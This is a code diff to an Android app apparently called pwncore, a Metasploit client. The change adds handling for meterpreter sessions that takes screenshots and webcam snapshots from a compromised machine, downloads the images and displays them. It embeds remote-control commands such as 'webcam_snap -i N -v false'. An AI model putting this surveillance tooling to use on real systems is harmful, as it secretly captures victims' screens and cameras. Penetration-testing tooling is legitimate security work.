@@ -1,5 +1,6 @@
 package com.anwarelmakrahy.pwncore.console;
 
+import java.io.File;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
@@ -8,13 +9,20 @@ import java.util.Map;
 import org.apache.commons.lang3.StringUtils;
 import org.msgpack.type.Value;
 
+import com.anwarelmakrahy.pwncore.MainService;
 import com.anwarelmakrahy.pwncore.StaticClass;
+import com.anwarelmakrahy.pwncore.activities.HostSessionsActivity;
 import com.anwarelmakrahy.pwncore.console.ConsoleSession.ConsoleSessionParams;
+import com.anwarelmakrahy.pwncore.plugins.Downloader;
+import com.anwarelmakrahy.pwncore.plugins.ImageViewerActivity;
 import com.anwarelmakrahy.pwncore.structures.SessionCommand;
 
 import android.app.Activity;
+import android.app.AlertDialog;
 import android.content.Context;
+import android.content.DialogInterface;
 import android.content.Intent;
+import android.net.Uri;
 import android.util.Log;
 
 public class ControlSession {
@@ -25,6 +33,7 @@ public class ControlSession {
 	private String id, prompt, type;
 
 	private Context context;
+	private Activity activity;
 
 	private boolean isWindowReady = false, isWindowActive = false;
 
@@ -148,6 +157,19 @@ public class ControlSession {
 		}
 	}
 
+	public void processVisualCommand(String cmd, Activity activity) {
+		this.activity = activity;
+		if (cmd.equals("screenshot")) {
+			write("screenshot");
+			cmdQueryPool.add(StaticClass.PWNCORE_SESSION_SCREENSHOT);
+		}
+		
+		else if (cmd.equals("webcam_snap")) {
+			write("webcam_list");
+			cmdQueryPool.add(StaticClass.PWNCORE_SESSION_WEBCAM_LIST);
+		}
+	}
+	
 	private void processIncomingData(final String data) {
 		if (type.equals("meterpreter")) {
 			if (cmdQueryPool.size() > 0) {
@@ -159,15 +181,83 @@ public class ControlSession {
 					cmdQueryPool.remove(
 							StaticClass.PWNCORE_SESSION_GET_AVAILABLE_COMMANDS);
 				}
+				
+				else if (cmdQueryPool.contains(
+						StaticClass.PWNCORE_SESSION_SCREENSHOT) &&
+						data.split("\n")[0].trim().startsWith("Screenshot saved to:")) {
+					
+					String path = data.split("\n")[0].trim().substring(21).trim();
+					write("ls " + path);
+					cmdQueryPool.add(StaticClass.PWNCORE_SESSION_GET_SCREENSHOT_SIZE);
+					cmdQueryPool.remove(StaticClass.PWNCORE_SESSION_SCREENSHOT);
+				}
+				
+				else if (cmdQueryPool.contains(
+						StaticClass.PWNCORE_SESSION_GET_SCREENSHOT_SIZE) &&
+						data.replace("  ", " ").split(" ").length == 7) {
+					String[] args = data.replace("  ", " ").trim().split(" ");
+					downloader = new Downloader(args[6], Integer.parseInt(args[1]), "screenshot", true);
+					write(downloader.getDownloadCmd());
+					cmdQueryPool.add(StaticClass.PWNCORE_SESSION_GET_SCREENSHOT_FILE);
+					cmdQueryPool.remove(StaticClass.PWNCORE_SESSION_GET_SCREENSHOT_SIZE);
+				}
+				
+				else if (cmdQueryPool.contains(
+						StaticClass.PWNCORE_SESSION_WEBCAM_LIST) &&
+						data.split(" ")[0].endsWith(":") &&
+						data.toLowerCase().contains("webcam")) {
+					final String[] webcams = data.split("\n");
+					
+	                if (activity != null)
+	                	activity.runOnUiThread(new Runnable(){
+							@Override
+							public void run() {
+								AlertDialog webcamsDialog;
+				                AlertDialog.Builder builder = new AlertDialog.Builder(activity != null ? activity: context);
+				                builder.setTitle("Select Webcam");
+				                builder.setSingleChoiceItems(webcams, -1, new DialogInterface.OnClickListener() {
+				                public void onClick(DialogInterface dialog, int item) {					               
+				                		write("webcam_snap -i " + Integer.toString(item + 1) + " -v false");
+				                		cmdQueryPool.add(StaticClass.PWNCORE_SESSION_WEBCAM_SNAP);
+				                		cmdQueryPool.remove(StaticClass.PWNCORE_SESSION_WEBCAM_LIST);
+				                    	dialog.dismiss();    
+			                		}
+				                });
+				                webcamsDialog = builder.create();
+								webcamsDialog.show();
+							}
+						});
+				}
+				
+				else if (cmdQueryPool.contains(
+						StaticClass.PWNCORE_SESSION_WEBCAM_SNAP) &&
+						data.contains("Webcam shot saved to:")) {
+					
+					for (String path: data.split("\n")) {
+						if (path.startsWith("Webcam shot saved to:")) {
+							path = path.trim().substring(21).trim();
+							write("ls " + path);
+							cmdQueryPool.add(StaticClass.PWNCORE_SESSION_GET_WEBCAM_SNAP_SIZE);
+							cmdQueryPool.remove(StaticClass.PWNCORE_SESSION_WEBCAM_SNAP);
+							break;
+						}
+					}
+				}
+				
+				else if (cmdQueryPool.contains(
+						StaticClass.PWNCORE_SESSION_GET_WEBCAM_SNAP_SIZE) &&
+						data.replace("  ", " ").split(" ").length == 7) {
+					String[] args = data.replace("  ", " ").trim().split(" ");
+					downloader = new Downloader(args[6], Integer.parseInt(args[1]), "webcam_snap", true);
+					write(downloader.getDownloadCmd());
+					cmdQueryPool.add(StaticClass.PWNCORE_SESSION_GET_WEBCAM_SNAP_FILE);
+					cmdQueryPool.remove(StaticClass.PWNCORE_SESSION_GET_WEBCAM_SNAP_SIZE);
+				}
 			}
 		}
-		// new Thread(new Runnable() {
-		// @Override public void run() {
-		//
-		// }
-		// }).start();
 	}
 
+	Downloader downloader;
 	private void parseAvailableCommands(String data) {
 		String[] lines = data.split("\n");
 		String codename;
@@ -182,10 +272,13 @@ public class ControlSession {
 				continue;
 			}
 			else if (lines[i].trim().length() > 0) {
-				codename = lines[i].trim().split(" ")[0];
-				cmd = new SessionCommand(codename);
-				cmd.setDescription(lines[i].trim().substring(codename.length()).trim());
-				structCommands.put(codename, cmd);
+				codename = lines[i].trim().split(" ")[0];			
+				if (StaticClass.getSessionImplCmds().contains(codename)) {		
+					cmd = new SessionCommand(codename);
+					cmd.setDescription(lines[i].trim().substring(codename.length()).trim());
+					cmd.setImplemented(true);
+					structCommands.put(codename, cmd);
+				}
 			}
 		}
 	}
@@ -274,8 +367,40 @@ public class ControlSession {
 		}
 	}
 
-	private void processIncomingDataBytes(byte[] data) {
-
+	protected void processIncomingDataBytes(byte[] data) {
+		if (type.equals("meterpreter") && 
+				cmdQueryPool.size() > 0) {
+			
+			if (cmdQueryPool.contains(
+					StaticClass.PWNCORE_SESSION_GET_SCREENSHOT_FILE) &&
+					downloader != null) {
+				downloader.addToBuffer(data);
+				if (downloader.hasFinished()) {				
+					context.startActivity(
+							new Intent(context, ImageViewerActivity.class)
+							.putExtra("type", "screenshot")
+							.putExtra("path", downloader.getFullPath())
+							.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
+					cmdQueryPool.remove(StaticClass.PWNCORE_SESSION_GET_SCREENSHOT_FILE);
+				}
+				else pingReadListener();
+			}
+			
+			else if (cmdQueryPool.contains(
+					StaticClass.PWNCORE_SESSION_GET_WEBCAM_SNAP_FILE) &&
+					downloader != null) {
+				downloader.addToBuffer(data);
+				if (downloader.hasFinished()) {				
+					context.startActivity(
+							new Intent(context, ImageViewerActivity.class)
+							.putExtra("type", "webcam_snap")
+							.putExtra("path", downloader.getFullPath())
+							.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
+					cmdQueryPool.remove(StaticClass.PWNCORE_SESSION_GET_WEBCAM_SNAP_FILE);
+				}
+				else pingReadListener();		
+			}
+		}
 	}
 
 	public void updateAllCommands() {
@@ -303,9 +428,5 @@ public class ControlSession {
 
 	public List<String> getImplementedCommands() {
 		return implCommands;
-	}
-
-	public void processVisualCommand(int position) {
-
 	}
 }
